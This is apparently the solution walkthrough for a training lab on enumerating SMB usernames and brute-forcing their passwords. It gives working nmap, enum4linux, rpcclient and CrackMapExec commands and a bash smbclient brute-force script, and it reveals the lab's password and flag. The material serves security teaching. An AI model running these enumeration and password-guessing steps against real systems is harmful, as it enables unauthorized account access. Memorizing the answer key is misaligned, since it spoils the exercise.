# Lab 3.4: SMB Username Enumeration and Brute Force

## Learning Objectives
- Enumerate valid usernames on SMB service
- Perform automated brute force attacks against enumerated users
- Combine enumeration with brute force techniques
- Use modern tools that support SMBv2/v3
- Capture the flag

## What is Username Enumeration and Brute Force?

This lab combines two critical attack techniques:

1. **Username Enumeration**: Discovering valid usernames on the target system
2. **Brute Force**: Systematically testing passwords against known usernames

Combining these techniques is more effective than brute forcing random usernames, as enumerated usernames are guaranteed to exist.

### Important Note About SMB Versions

**Modern Samba servers use SMBv2/v3 by default**, which many older brute force tools do not support:
- **Hydra**: Only supports SMBv1 (deprecated and disabled by default)
- **CrackMapExec**: Supports SMBv2/v3 (recommended)
- **smbclient**: Supports all SMB versions (can be scripted)

This lab uses modern SMB protocols, so we'll use tools that support SMBv2/v3.

## Solution Walkthrough

### Step 1: Obtain Target IP Address

Get the target IP address from the lab platform before starting enumeration.

**Detailed Steps:**

1. **Discover the target IP:**
   - The lab panel shows your network subnet (e.g., `10.X.Y.0/24`)
   - Scan the subnet to find live hosts: `nmap -sn <subnet>`
   - The target will be one of the discovered hosts

2. **Verify network connectivity:**
   ```bash
   ping -c 3 <target_ip>
   ```

3. **Verify SMB service is running:**
   ```bash
   nmap -p 445 <target_ip>
   ```

   **Expected output:**
   ```
   PORT    STATE SERVICE
   445/tcp open  microsoft-ds
   ```

### Step 2: Enumerate Users

Enumerate users to identify valid usernames before brute forcing. **This is critical - you must enumerate first to find the correct username!**

**Detailed Steps:**

1. **Method 1: Use enum4linux:**
   ```bash
   enum4linux -U <target_ip>
   ```
   
   Replace `<target_ip>` with your actual target IP

2. **Expected output:**
   ```
   ============================================
   |    User Information on <target_ip>    |
   ============================================
   
   S-1-5-21-...-1000 ADMIN
   S-1-5-21-...-1001 USER1
   S-1-5-21-...-501 GUEST
   ```

3. **Extract usernames:**
   ```bash
   enum4linux -U <target_ip> | grep -E "^S-1-5" | awk '{print $2}'
   ```

   **Expected output:**
   ```
   ADMIN
   USER1
   GUEST
   ```

   **Important**: The username is `USER1` (uppercase), but you'll need to try both `user1` (lowercase) and `USER1` (uppercase) when brute forcing, as Samba is case-insensitive for usernames but tools may be case-sensitive.

4. **Method 2: Use rpcclient:**
   ```bash
   rpcclient -U "" -N <target_ip>
   ```
   
   Then in the rpcclient prompt:
   ```bash
   rpcclient $> enumdomusers
   rpcclient $> exit
   ```

   **Expected output:**
   ```
   user:[admin] rid:[0x3e8]
   user:[user1] rid:[0x3e9]
   user:[guest] rid:[0x3ea]
   ```

5. **Document discovered usernames:**
   - Note all discovered usernames
   - Focus on non-default accounts (`user1`, `USER1`, etc.)
   - Default accounts (admin, guest) may have different security
   - **The target username for this lab is `user1` (lowercase)**

### Step 3: Create Password Wordlist

Prepare a password wordlist for brute forcing.

**Detailed Steps:**

1. **Create password wordlist:**
   ```bash
   echo -e "password\nadmin\nadmin123\nqwerty\n123456\npassword123\nPassword123\nletmein\nwelcome" > wordlist.txt
   ```

2. **Verify wordlist:**
   ```bash
   cat wordlist.txt
   ```

   **Expected output:**
   ```
   password
   admin
   admin123
   qwerty
   123456
   password123
   Password123
   letmein
   welcome
   ```

3. **Alternative: Use existing wordlist:**
   ```bash
   # Use rockyou.txt (large wordlist)
   cp /usr/share/wordlists/rockyou.txt wordlist.txt
   
   # Or use smaller common passwords list
   cp /usr/share/wordlists/fasttrack.txt wordlist.txt
   ```

### Step 4: Brute Force Password with CrackMapExec (Recommended)

Use CrackMapExec to brute force the password for the enumerated username. **Remember: Use the username you discovered during enumeration (`user1`), not `admin`!**

**Detailed Steps:**

1. **Verify CrackMapExec is installed:**
   ```bash
   which crackmapexec
   crackmapexec --version
   ```

   **If not installed:**
   ```bash
   # Install via pip (if available)
   pip3 install crackmapexec
   
   # Or install via apt (Kali Linux)
   sudo apt update && sudo apt install crackmapexec
   ```

2. **Run CrackMapExec brute force:**
   ```bash
   crackmapexec smb <target_ip> -u user1 -p wordlist.txt
   ```
   
   Replace `<target_ip>` with your actual target IP

   **Important**: Use `user1` (the username you discovered during enumeration), not `admin`!

   **Command breakdown:**
   - `crackmapexec`: Modern penetration testing tool
   - `smb`: Protocol to test (SMB)
   - `<target_ip>`: Target IP address
   - `-u user1`: Username to test (from enumeration)
   - `-p wordlist.txt`: Password wordlist file

3. **Expected output:**
   ```
   SMB         <target_ip>      445    TARGET-HOST      [*] Windows 6.1 Build 0 (name:TARGET-HOST) (domain:WORKGROUP) (signing:False) (SMBv1:False)
   SMB         <target_ip>      445    TARGET-HOST      [+] WORKGROUP\user1:password123
   ```

   **Key information:**
   - `[+]` indicates successful authentication
   - `WORKGROUP\user1:password123` shows the valid credentials
   - Username: `user1`
   - Password: `password123`

4. **Alternative: Test specific share:**
   ```bash
   crackmapexec smb <target_ip> -u user1 -p wordlist.txt --shares
   ```

### Step 5: Brute Force with smbclient Script (Alternative Method)

If CrackMapExec is not available, you can use a bash script with `smbclient` to brute force passwords.

**Detailed Steps:**

1. **Create brute force script:**
   ```bash
   cat > smb_brute.sh << 'EOF'
   #!/bin/bash
   TARGET="$1"
   USERNAME="$2"
   WORDLIST="$3"
   SHARE="private"
   
   if [ -z "$TARGET" ] || [ -z "$USERNAME" ] || [ -z "$WORDLIST" ]; then
       echo "Usage: $0 <target_ip> <username> <wordlist>"
       exit 1
   fi
   
   while read password; do
       echo "[*] Trying password: $password"
       if smbclient "//$TARGET/$SHARE" -U "$USERNAME%$password" -c "ls" > /dev/null 2>&1; then
           echo "[+] SUCCESS! Username: $USERNAME Password: $password"
           exit 0
       fi
   done < "$WORDLIST"
   
   echo "[-] No valid password found in wordlist"
   exit 1
   EOF
   
   chmod +x smb_brute.sh
   ```

2. **Run the brute force script:**
   ```bash
   ./smb_brute.sh <target_ip> user1 wordlist.txt
   ```

   Replace `<target_ip>` with your actual target IP. **Remember: Use `user1` (from enumeration), not `admin`!**

3. **Expected output:**
   ```
   [*] Trying password: password
   [*] Trying password: admin
   [*] Trying password: admin123
   [*] Trying password: qwerty
   [*] Trying password: 123456
   [*] Trying password: password123
   [+] SUCCESS! Username: user1 Password: password123
   ```

### Step 6: Connect and Retrieve Flag

Use the discovered credentials to connect to the SMB share and retrieve the flag.

**Detailed Steps:**

1. **Connect with discovered credentials:**
   ```bash
   smbclient //<target_ip>/private -U user1%password123
   ```
   
   Replace `<target_ip>` with your actual target IP, `user1` with the enumerated username, and `password123` with the discovered password.

   **Important**: Use `user1` (from enumeration), not `admin`!

2. **Expected successful connection:**
   ```
   Try "help" for a list of possible commands.
   smb: \>
   ```

3. **List files in the share:**
   ```bash
   ls
   ```

   **Expected output:**
   ```
     .                                   D        0  Mon Jan 15 10:00:00 2024
     ..                                  D        0  Mon Jan 15 10:00:00 2024
     flag.txt                            A       45  Mon Jan 15 10:00:00 2024
   
                   524288 blocks of size 1024. 524288 blocks available
   ```

4. **Download the flag:**
   ```bash
   get flag.txt
   ```

5. **Exit and view:**
   ```bash
   exit
   cat flag.txt
   ```

   **Expected output:**
   ```
   OCR{smb_3num_brut3}
   ```

### Step 7: Verify Flag Format

Ensure the flag is in the correct format before submission.

**Flag format:**
```
OCR{smb_3num_brut3}
```

**Verification checklist:**
- ✅ Starts with `OCR{`
- ✅ Ends with `}`
- ✅ Contains only alphanumeric characters and underscores
- ✅ No extra spaces or characters

## Common Mistakes and Troubleshooting

### "NT_STATUS_ACCESS_DENIED" Error

**Cause**: You're using the wrong username or the user isn't in Samba's password database.

**Solutions:**
- ✅ **Enumerate users first** to find the correct username (`user1`, not `admin`)
- ✅ Use the username from enumeration (`user1`) when brute forcing
- ✅ Verify the password is correct: `password123`

### "NT_STATUS_LOGON_FAILURE" Error

**Cause**: Password is incorrect or user doesn't exist in Samba's password database.

**Solutions:**
- Verify you enumerated users correctly
- Ensure password wordlist contains `password123`
- Try both `user1` (lowercase) and `USER1` (uppercase) if enumeration shows uppercase

### CrackMapExec Shows Success But smbclient Fails

**Cause**: CrackMapExec may authenticate at the SMB level, but the user may not have access to the specific share.

**Solutions:**
- Verify you're using the correct username from enumeration (`user1`)
- Check that the share name is correct (`private`)
- Ensure the user has access to the share (should be configured in Dockerfile)

### Wrong Username

**Common mistake**: Using `admin` instead of `user1`.

**Solution**: Always enumerate users first! The lab creates `user1`, not `admin`.

```bash
# Enumerate first
enum4linux -U <target_ip>

# Then use the discovered username
crackmapexec smb <target_ip> -u user1 -p wordlist.txt
```

## Success Criteria

- ✅ Verified target IP and SMB service accessibility
- ✅ Enumerated users using enum4linux or rpcclient
- ✅ Identified target username (`user1` from enumeration)
- ✅ Created password wordlist with common passwords
- ✅ Ran brute force attack using CrackMapExec or smbclient script
- ✅ Discovered valid password for enumerated username (`user1:password123`)
- ✅ Successfully connected to private share with discovered credentials
- ✅ Listed files and located flag.txt
- ✅ Downloaded flag using `get` command
- ✅ Verified flag format is correct: `OCR{...}`

## Key Learning Points

- **Enumeration First**: Always enumerate users before brute forcing
- **Use Enumerated Usernames**: Don't guess usernames - use what you discover
- **Modern SMB Protocols**: SMBv2/v3 are standard; use tools that support them
- **Tool Selection**: Choose tools that support the protocol version in use
- **Combined Techniques**: Enumeration + brute force is more effective than brute force alone
- **Credential Verification**: Always verify discovered credentials by connecting manually

## Alternative Tools and Methods

### Method 1: CrackMapExec (Best for Modern SMB)

```bash
# Basic brute force
crackmapexec smb <target_ip> -u user1 -p wordlist.txt

# With share enumeration
crackmapexec smb <target_ip> -u user1 -p wordlist.txt --shares

# Save successful credentials
crackmapexec smb <target_ip> -u user1 -p wordlist.txt --shares | tee results.txt
```

### Method 2: smbclient Script (Universal)

The bash script method works with all SMB versions and doesn't require additional tools.

### Method 3: Using Hydra (Not Recommended - SMBv1 Only)

**Note**: Hydra only supports SMBv1, which is deprecated and disabled by default in modern Samba. This lab uses modern SMB protocols, so Hydra will not work.

## Common Mistakes

- ❌ Not enumerating users first
- ❌ Using wrong username (`admin` instead of `user1`)
- ❌ Using Hydra (only supports SMBv1, won't work)
- ❌ Wordlist too small or missing common passwords
- ❌ Not verifying discovered credentials

## Hints

1. **Enumerate first**: Use `enum4linux -U <target_ip>` to find usernames
2. **Target username**: Look for `user1` (not `admin`)
3. **Use modern tools**: `crackmapexec smb <target_ip> -u user1 -p wordlist.txt`
4. **Password**: Common password pattern with numbers
5. **Password is in most wordlists**: `password123`
